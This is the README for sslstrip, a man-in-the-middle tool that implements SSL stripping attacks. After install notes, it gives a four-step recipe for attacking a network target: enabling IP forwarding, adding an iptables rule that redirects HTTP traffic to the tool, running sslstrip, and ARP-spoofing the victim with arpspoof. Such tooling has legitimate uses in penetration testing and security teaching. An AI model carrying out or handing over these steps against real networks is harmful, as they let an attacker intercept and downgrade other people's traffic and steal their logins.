sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping 
attacks.

It requires Python 2.5 or newer, along with the 'twisted' python module.

Installing:
	pip install sslstrip

Running:
	sslstrip can be run from the source base without installation.  
	Just run 'python sslstrip.py -h' as a non-root user to get the 
	command-line options.

	The four steps to getting this working (assuming you're running Linux) 
	are:

	1) Flip your machine into forwarding mode (as root):
	   echo "1" > /proc/sys/net/ipv4/ip_forward

	2) Setup iptables to intercept HTTP requests (as root):
	   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>
	
	3) Run sslstrip with the command-line options you'd like (see above).

	4) Run arpspoof to redirect traffic to your machine (as root):
	   arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>
